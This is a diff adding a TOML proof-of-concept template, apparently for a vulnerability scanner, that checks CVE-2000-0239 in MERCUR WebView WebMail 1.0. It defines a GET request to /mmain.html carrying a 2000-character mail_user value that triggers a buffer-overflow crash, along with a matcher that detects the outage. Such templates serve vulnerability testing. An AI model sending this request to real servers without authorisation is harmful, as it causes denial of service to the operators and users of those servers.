@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "MERCUR WebView WebMail-Client 1.0 在处理 HTTP GET 请求时未对 mail_user 参数做边界检查，远程攻击者通过发送超长 mail_user 参数的请求触发缓冲区溢出导致服务崩溃（DoS）。本 PoC 通过发送包含超长参数的 GET 请求验证目标服务是否崩溃或无响应。"
+id = "POC-AVE-2000-0217"
+name = "CVE-2000-0239 MERCUR WebView WebMail mail_user 缓冲区溢出 DoS PoC"
+severity = "medium"
+tags = ["ave-2000-0217"]
+vuln_id = [
+    "CVE-2000-0239",
+    "AVE-2000-0217",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/mmain.html?mail_user={{repeat('A', 2000)}}&"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "mail_user",
+    "WebView",
+    "MERCUR",
+]
